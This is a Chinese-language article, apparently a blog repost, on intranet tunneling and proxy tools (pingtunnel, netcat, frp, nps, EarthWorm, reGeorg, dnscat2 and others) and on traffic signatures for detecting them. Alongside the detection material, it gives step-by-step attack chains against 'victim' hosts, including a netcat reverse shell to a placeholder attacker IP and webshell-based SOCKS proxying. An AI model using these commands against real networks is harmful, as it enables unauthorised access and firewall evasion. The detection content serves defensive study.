## **1、相关概念**

 **1.1 隧道技术的概念**

今天想跟大家聊一聊常用的内网代理工具和对这些工具常见的检测方法。内网代理一般使用隧道技术，援引一段百度百科对“隧道技术”的介绍：

隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。

被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。

 **1.2 正向与反向代理的概念**

正向代理和反向代理是资源访问上的两个不同概念，一般来讲有下面两个含义。

正向代理：当客户端无法访问外部资源的时候（由于诸如墙这样的原因），可以通过一个正向代理去间接访问，所以客户端需要配置代理服务器的ip。正向代理是一个位于客户端和原始服务器之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。

反向代理：客户端是无感知代理的存在，以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端。

![](https://image.3001.net/images/20220125/1643074975_61ef559fb564282016f1d.jpg!small)

图1.2.1 正向与反向代理之间的区别与联系

但是对于渗透攻击者来说，从视角上看到的正向代理和反向代理和传统定义的正向与反向代理有一定区别。简单来说可以这样理解：

正向代理：攻击者主动连接代理服务器

反向代理：代理服务器主动连接攻击者

 **1.3 内网穿透的具体表现**

内网穿透是指通过“隧道技术”打通了一条从攻击者到目标机器的通道，主要表现为下面三个方面。

> 1）反弹shell
>
> 从目标机器能够反弹shell到攻击者的外网vps，攻击者通过反弹回来的shell能够很方便的对目标内网进行扫描，这就是反向代理的一种表现形式。
>
> 2）端口转发
>
> 通过指定一条专门的通道，能够对目标内网某台机器的某个具体端口进行访问，这种端口转发通常是一对一的。
>
> 3）sock代理或者http代理
>
> 开通一条专门的通道，并且提供http代理或者sock代理。攻击者可以通过配置响应的代理，直接访问目标内网任意机器，这就是正向代理的一种表现形式。

##  **2、常用隧道介绍**

我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道、tcp隧道等。理论上所有的协议都可以作为隧道传输协议，并且传输的数据可以支持自定义的加解密算法。

按照隧道所处的协议层对不同的隧道技术进行分类，大体上可以分为下面几种。

 **2.1 网络层隧道**

 **2.1.1 ICMP隧道**

 **2.1.1.1 常见ICMP隧道工具**

ICMP隧道是指通过ICMP协议来传输数据，ICMP协议不需要开放新的端口，容易被防火墙放过，是目前目标流行的一种绕过防火墙的数据传输方式之一。

 **1）icmpsh**

icmpsh是一个比较轻巧的ICMP隧道技术工具，能够通过ICMP来反弹shell。优点是不需要目标机器上的root权限，缺点是功能单一，反弹回来的cmd极不稳定。

由于icmpsh对应传输的ICMP数据并没有加密，所以通过抓包很容易检测到其中的特征数据，如图2.1.1.1.1所示。

![](https://image.3001.net/images/20220125/1643075107_61ef5623d9834cfeaa15d.jpg!small)

图2.1.1.1.1 icmpsh的数据包流量特征

github: https://github.com/inquisb/icmpsh

使用参考：

https://www.freebuf.com/articles/web/250711.html

 **2）icmptunnel**

icmptunnel是通过在客户端和服务端分别创建虚拟网卡，利用ICMP协议来传输两个虚拟网卡之间的数据。缺点是需要root权限，并且要创建网卡，容易被发现。

github: https://github.com/DhavalKapil/icmptunnel

使用参考：

https://www.freebuf.com/articles/network/242015.html

 **3）pingtunnel**

Pingtunnel是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。

利用条件：需要root或者administrator/system权限。网上有的说法是不需要管理员权限，本人实际测试中，管理员权限是需要的。

参考：https://github.com/esrrhs/pingtunnel

◆ 构建正向代理的ICMP攻击链路

被攻击端：

Victim1 x.x.x.x (公网地址)， 10.29.84.80（内网地址）

Victim2 10.29.84.63（内网地址）

攻击端：

Attack 随意，能上网就行

整个利用过程如下：

① 在Victim1的机器上运行代码，运行之后Victim1 就是ICMP SERVER。会接受客户端发过来的ICMP数据包。

> ./pingtunnel -type server -noprint 1 -nolog 1

-type server 代表开启ICMP SERVER端，等待客户端进行连接与通信。

-noprint 1 不在控制台打印日志

-nolog 1 不存储日志文件

② 在Attack的机器上运行代码，运行之后代表Attack的机器开启4455端口作为sock5代理。

> pingtunnel.exe -type client -l :4455 -s xx.xx.xx.xx -sock5 1 -noprint 1
> -nolog 1

其中xx.xx.xx.xx替换为Victim1 对应的IP

③ 攻击者可以通过Proxifier设置全局的sock5代理来对目标内网的Victim2进行攻击。简单验证的话可以直接在浏览器中设置sock5代理。

![](https://image.3001.net/images/20220125/1643075222_61ef5696639aa108a8464.jpg!small)

图2.1.1.1.2.正向代理的ICMP攻击链路

正向代理的ICMP攻击链路，要求目标机器1必须有公网IP，并且能正常地进行PING操作。

◆ 构建反向代理的ICMP攻击链路

被攻击端：

Victim1 10.29.84.80（内网地址）

Victim2 10.29.84.63（内网地址）

攻击端：

Attack xx.xx.xx.xx（公网IP）

反向代理和正向代理的攻击方式相比，就是把运行的代码交换了位置，原来在攻击者机器运行的程序换到目标机器1上运行，原来在目标机器1上运行的程序换到攻击者机器上运行。

① 在Attack的机器上运行代码，运行之后Attack就是ICMP SERVER。会接受客户端发过来的ICMP数据包。

> ./pingtunnel -type server -noprint 1 -nolog 1

-type server 代表开启ICMP SERVER端，等待客户端进行连接与通信。

② 在Victim1的机器上运行代码，运行之后代表Victim1的机器开启4455端口作为sock5代理。

> pingtunnel.exe -type client -l :4455 -s xx.xx.xx.xx -sock5 1 -noprint 1
> -nolog 1

其中xx.xx.xx.xx替换为Attack对应的IP

![](https://image.3001.net/images/20220125/1643075388_61ef573c615bfe7087e8c.jpg!small)

图2.1.1.1.3 反向代理的ICMP攻击链路

但是到目前为止，我们只是在目标机器1上开启了一个sock5的代理端口4455，代理之后的请求会通过ICMP的请求包进行转发。

 **2.1.1.2 ICMP隧道检测技术**

 **1）通过ICMP数据包的数量检测**

一个正常的 ping每秒最多只会发送两个数据包，而使用ICMP隧道的浏览器在同一时间会产生大量ICMP 数据包。

![](https://image.3001.net/images/20220125/1643075420_61ef575c3b8f963f644ad.jpg!small)图2.1.1.2.1短时间内产生大量ICMP数据包

 **2）对单个数据包的DATA字段大小进行检验**

ICMP隧道数据包中DATA 往往大于64 比特

![](https://image.3001.net/images/20220125/1643075441_61ef57718c7af17f61e21.jpg!small)

图2.1.1.2.2单个ICMP数据包的大小远大于正常数据包

 **3）寻找响应数据包和请求数据包payload不一致的ICMP数据包**

![](https://image.3001.net/images/20220125/1643075609_61ef5819cdcdd4a0e2a2e.jpg!small)

图2.1.1.2.3请求和响应不一致的数据包

> windows系统下ping默认传输的是：abcdefghijklmnopqrstuvwabcdefghi，共32bytes
>
> linux系统下，ping默认传输的是48bytes，前8bytes随时间变化，后面的固定不变，内容为!”#$%&’()+,-./01234567

参考:

https://www.freebuf.com/articles/network/202634.html

 **4）检查ICMP数据包的协议标签**

比如icmptunnel会在所有icmp payload前面加上TUNL标识来标识隧道。

![](https://image.3001.net/images/20220125/1643075688_61ef586813c65fad73da8.jpg!small)

图2.1.1.2.4部分数据包的特殊标识

 **2.2 传输层隧道**

 **2.2.1 TCP隧道**

 **2.1.1.1 常见TCP隧道工具**

 **1）netcat**

又名nc，使用量最广的反弹shell的手段之一，linux系统一般自带。

地址：https://eternallybored.org/misc/netcat/

使用参考：

https://blog.csdn.net/csacs/article/details/91440568

使用步骤，在服务端监听端口

> nc -lvvp 8443

在客户端连接服务端端口

> nc.exe -e cmd xx.xx.xx.xx 8443

![](https://image.3001.net/images/20220125/1643075799_61ef58d7807c5617d5d26.jpg!small)

图2.1.1.1.1 nc反弹shell截图

 **2）Powercat**

powershell版本的nc，用法基本上同nc一样。

参考：https://github.com/besimorhino/powercat

 **3）lcx**

lcx是一款比较常见的端口转发工具，上个世纪的产品了，以前用的多，现在已经用的人比较少了，主要是基本上的杀软都会杀。

参考：https://github.com/windworst/LCX

 **4）HTRAN**

功能基本上和lcx一样，但是是跨平台的。

参考：

https://github.com/bGN4/HTran/tree/master/HTran

 **5）Iox**

iox是一款功能强大的端口转发&内网代理工具，该工具的功能类似于lcx和ew，但是iox的功能和性能都更加强大。

地址：https://github.com/EddieIvan01/iox

参考：

https://www.freebuf.com/articles/network/244567.html

 **6）NATBypass**

使用go语言编写的端口转发工具，功能和用法基本上和lcx一样，具有很好的跨平台性。

地址：https://github.com/cw1997/NATBypass

 **7）ew(EarthWorm)**

EW 是一套便携式的网络穿透工具，具有 SOCKS
v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。EW自带支持的多级代理机制是的EW成为目前最受攻击者喜欢的工具之一。

地址：http://rootkiter.com/EarthWorm/

 **8）Temite**

EarthWorm的升级版，已经永久停止更新。

地址：http://rootkiter.com/Termite/

 **9）Venom**

Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。

地址：https://github.com/Dliv3/Venom/

 **10）Stowaway**

Stowaway是一个利用go语言编写的多级代理工具，功能非常类似Venom。

地址：https://github.com/ph4ntonn/Stowaway

 **11）Ssocks**

正向和反向的socks工具，可执行文件的大小很小

地址：https://github.com/54Pany/sSocks

 **12）frp**

frp是一款轻量级的内网穿透工具，最早是为了方便运维人员远程对目标内网环境进行管理，提供了tcp端口转发、http代理、socks5代理等功能。

地址：https://github.com/fatedier/frp

 **13）npc/nps**

npc/nps是一款基于TCP协议的代理工具，本身提供基于各种平台的客户端，稳定性好，并且可以自定义数据加密方式。支持端口转发，http代理，sock5代理。是目前最受攻击者喜欢的工具之一。

地址：

https://ehang-io.github.io/nps/；

https://github.com/ehang-io/nps

使用nps/npc构建反向代理使用步骤

① 在外网的vps上面运行

> docker run --name nps -p 280:80 -p 2443:443 -p 28080:8080 -p 28024:8024 -p
> 5001-5100:5001-5100 -v /opt/conf:/conf ffdfgdfg/nps

② 打开nps对应的web服务http://xx.xx.xx.xx:28080/，输入默认口令 admin 123

新建一个客户端地址，记录下生成的随机key

![](https://image.3001.net/images/20220125/1643075942_61ef59664b298e69e3b89.jpg!small)

③在目标机器上面运行

> npc -server=xx.xx.xx.xx:28024 -vkey=kow4td3v819abec6 -type=tcp

![](https://image.3001.net/images/20220125/1643075989_61ef599561557553fadd1.jpg!small)

④ 在nps的管理端，显示连接为“在线”之后，点击“隧道”，新增一个socks5隧道。

端口选择5001-5100中的某个端口。

![](https://image.3001.net/images/20220125/1643076020_61ef59b437ac59b1f58f6.jpg!small)经过上面的步骤之后，我们就在vps上面开放了一个sock5代理，端口为5002。连接该代理的请求会直接转发到目标机器内网。

 **2.1.1.2 TCP隧道检测技术**

不同的工具使用的TCP隧道发送和接受数据包的格式都不一样，并且由于TCP隧道目前来说相对比较成熟，也导致大多数TCP隧道都是属于加密隧道。

对于简单的非加密的隧道工具，通常我们直接从数据包中就能找到很明显的特征。如图2.1.1.2.1所示。

![](https://image.3001.net/images/20220125/1643076181_61ef5a55359e56c37717f.jpg!small)

图2.1.1.2.1NC明文传输的TCP数据包特征流量

EarthWorm(简称ew)是一款比较好用的多级代理转发工具，相较于其他很多工具都要小很多，适用于一些特殊场景。与nc相比，EarthWorm能够提供socks5代理的功能，适用性明显更广泛一些。但是从本质上来说EarthWorm还是只是流量转发的工具，并没有对流量进行加密，从流量中能够看到明文的内网请求的流量。

![](https://image.3001.net/images/20220125/1643076215_61ef5a77ed89584293321.jpg!small)

图2.1.1.2.2使用EW转发明文的内网请求流量

EW在建立连接和维持连接的时候也有明显的特征，通过TCP连接发送和响应数据包“xx xx 00 00 00
00”来保持连接。最开始的时候客户端会向服务端发送“01 01 00 00 00 00”（如图2.1.1.2.3所示），服务端会响应“01 02 00 00
00 00”。后面的很多tcp包都和这个很相似，可以作为流量匹配的特征。

![](https://image.3001.net/images/20220125/1643076262_61ef5aa62c59d121de36d.jpg!small)

图2.1.1.2.3使用EW建立连接和维持连接状态的特征包

对于加密传输的数据包流量，就只能针对不同的工具寻找对应不同的特征点。抓了一下npc在建立连接之后的特征，npc的客户端在与服务端建立连接之后，会一直发送带有当前时间信息的数据包。

![](https://image.3001.net/images/20220125/1643076307_61ef5ad35b3124af63d9a.jpg!small)

图2.1.1.2.4 NPC心跳数据包特征

frp是另一种常用的内网代理工具，使用frp建立作为内网代理工具时也有明显的流量特征。在客户端和服务端建立tcp连接时，客户端会发送本机基础信息和frp版本信息，均为明文的流量信息，如图2.1.1.2.5所示。因为frp默认使用TLS加密数据，tcp的数据包中会有很多关于TLS证书相关的信息，如图2.1.1.2.6所示。

![](https://image.3001.net/images/20220125/1643076344_61ef5af8a176e9c7df39d.jpg!small)图2.1.1.2.5
frp连接建立时的流量特征

![](https://image.3001.net/images/20220125/1643076396_61ef5b2c5deb32d6773a0.jpg!small)图2.1.1.2.6
frp数据包中的TLS特征

 **2.1 网络层隧道**

 **2.2.2 UDP隧道**

 **2.2.2.1常见UDP隧道工具**

 **1）Udp2raw**

一款常见的UDP隧道工具，该工具可以利用原始套接字并通过伪造的TCP/UDP/ICMP流量来帮助研究人员绕过UDP防火墙。

 **2）frp**

frp既是一款常见的TCP隧道工具，也是一款UDP隧道工具。

要通过UDP协议来转发内网请求，可以通过在frp中开启kcp模式，如图2.2.2.1.1所示。从图中可以看出，使用UDP协议和TCP协议的流量特征一样的。

![](https://image.3001.net/images/20220125/1643076465_61ef5b7198c9af1c1e4e8.jpg!small)

图2.2.2.1.1 frp使用udp协议搭建内网代理

 **2.3 应用层隧道**

 **2.3.1 DNS隧道**

 **2.3.1.1常见DNS隧道工具**

 **1）dnscat2**

通过将其他协议封装在DNS协议中传输建立通信。因为在我们的网络世界中DNS是一个必不可少的服务，所以大部分防火墙和入侵检测设备很少会过滤DNS流量，这就给DNS作为一种隐蔽信道提供了条件，从而可以利用它实现诸如远程控制，文件传输等操作。

地址：https://github.com/iagox86/dnscat2

 **2）dnscat2-powrshell**

Powershelll版本的dnscat2。

地址：https://github.com/lukebaggett/dnscat2-powershell

 **3）dns2tcp**

dns2tcp
是一个利用DNS隧道转发TCP连接的工具，支持KEY和TXT类型的请求，用C语言开发。它分为两个部分，服务端和客户端，服务端运行在linux服务器上，客户端可以运行在linux和windows上(其他平台没有测试过)，编译完成后在服务端上的可执行文件名称为dns2tcpd，在客户端(linux)上的名称为dns2tcpc。

地址：https://github.com/alex-sector/dns2tcp

 **4）Iodine**

iodine是目前比较活跃，知名度比较大的一个dns tunneling实现工具，平台覆盖范围广，它可以运行在Linux, Mac OS X,
FreeBSD, NetBSD, OpenBSD 和 Windows上，甚至还有android客户端，不过它需要安装TUN/TAP。

地址：https://github.com/yarrick/iodine

 **2.3.1.2 DNS隧道检测技术**

 **1）通过请求和相应包的大小进行监测**

通常dns tunneling为了取得较大的带宽，会选择构造尽量大的dns请求和响应。

2）检测TXT记录类型发送请求和响应，而在正常的DNS网络流量中，TXT记录的比例可能只有1%-2%，如果时间窗口内，TXT记录的比例激增，那么也意味着存在异常。

3）还有各种各样的论文，有好多论文都提到了怎么检测DNS隧道流量检测。运用了各种算法，看不懂。

 **2.3.2 SSH隧道**

ssh隧道通常不使用第三方的工具，直接使用linux自带的openssh客户端就可以进行端口转发。使用方法如下

> sudo ssh -Nf -L 192.168.0.159:3334:192.168.213.131:3389 192.168.0.159

![](https://image.3001.net/images/20220125/1643076592_61ef5bf09c2295ffbcd39.jpg!small)

这里我们用到了SSH客户端的三个参数，下面我们一一做出解释：

> ◆ -N 告诉SSH客户端，这个连接不需要执行任何命令。仅仅做端口转发
>
> ◆ -f 告诉SSH客户端在后台运行
>
> ◆ -L 做本地映射端口，被冒号分割的三个部分含义分别是最后一个参数是我们用来建立隧道的中间机器的IP地址(IP: 192.168.0.159)
>
> ◆ 需要使用的本地端口号（端口: 3334)
>
> ◆ 需要访问的目标机器IP地址（IP: 192.168.213.131）
>
> ◆ 需要访问的目标机器端口（端口: 3389)

那么本地局域网的任何机器访问192.168.0.159:3334都会自动被映射到192.168.213.131:3389。

![](https://image.3001.net/images/20220125/1643076639_61ef5c1f5b0fba22685de.jpg!small)

图2.3.2.1 ssh端口转发之后效果

 **2.3.3 HTTP隧道**

 **2.3.3.1常见的HTTP隧道工具**

 **1）reDuh**

最早出现的http正向代理的工具，能够把webshell转化进行端口转发，工具客户端提供gui界面。

 **2）tunnel**

属于reDuh的升级产品，通过在攻击端使用python把webshell转化为sock代理和端口转发。，目前来说还是有比较大的使用量。

地址：https://github.com/SECFORCE/Tunna

 **3）reGeoge**

reGeoge属于tunnel的替代和升级产品，通过在攻击端使用python把webshell转化为sock5代理。属于目前还比较流行的一种内网穿透方式。

地址：https://github.com/sensepost/reGeorg

具体的使用步骤如下：

◆ 上传对应的tunnel文件到服务端，并且进行访问。如图2.3.3.1.1所示。

![](https://image.3001.net/images/20220125/1643076699_61ef5c5b3c3d40addafba.jpg!small)

图2.3.3.1.1 tunnel文件上传之后返回页面

◆ 本地攻击端通过python2运行

> python reGeorgSocksProxy.py -p 8888 -u <http://x.x.x.x/tunnel.php>

![](https://image.3001.net/images/20220125/1643076738_61ef5c827d424d768dd41.jpg!small)

图2.3.3.1.2通过webshell开启本地sock5代理

通过上面这两步之后就在本地开启了一个sock5代理，通过这个代理就可以直接访问到目标服务器的内网，配合proxifier等工具就能对目标内网进行扫描和其他攻击行为。

 **4）Neo-reGeorg**

重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃.

地址：https://github.com/L-codes/Neo-reGeorg

 **5）ABPTTS**

TCP over
HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp。

地址：https://github.com/nccgroup/ABPTTS

 **2.3.3.2 HTTP隧道检测技术**

http的隧道通常需要上传一个脚本文件（asp, aspx, php, jsp）。通过脚本文件来复用靶机的web端口，构造一条代理链路或者进行端口转发。

 **1）通过脚本文件页面返回内容进行检测。**

reDuh脚本文件默认返回。

![](https://image.3001.net/images/20220125/1643076798_61ef5cbe0e15c75b0e9f5.jpg!small)

图2.3.3.2.1 reDuh脚本默认返回

比如上传 ReGeorg tunnel文件，页面对应的返回基本上都是下面的页面内容。

![](https://image.3001.net/images/20220125/1643076838_61ef5ce60e930fb9501ad.jpg!small)

图2.3.3.2.2 reGeorg 页面默认响应

这种http代理类型的工具刚开始的时候都会有一个建立连接的请求包，这个请求包都具有比较明显的特征，如下所示。

![](https://image.3001.net/images/20220125/1643076874_61ef5d0aa32c9bf910940.jpg!small)2.3.3.2.3
reGeorg请求的默认请求头，其中Accept-Encoding字段有特征

![](https://image.3001.net/images/20220125/1643076919_61ef5d371f19316381078.jpg!small)

2.3.3.2.4 tunnel默认的请求头，其中authorization字段有特征

 **2）通过流量中的数据特征来分析攻击行为。**

这里的流量特征基本上都是明文信息，只要按照通用的攻击检测技术就可以了。

  

[原文链接](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483876&idx=1&sn=b71f016be9f345699efcbffdc27b626f&chksm=c2a1d56df5d65c7bbee6e1052d0405eab5cb6dbb98bd549459b83b5a2ab6b530cd078ca5398e&token=229680544&lang=zh_CN#rd)

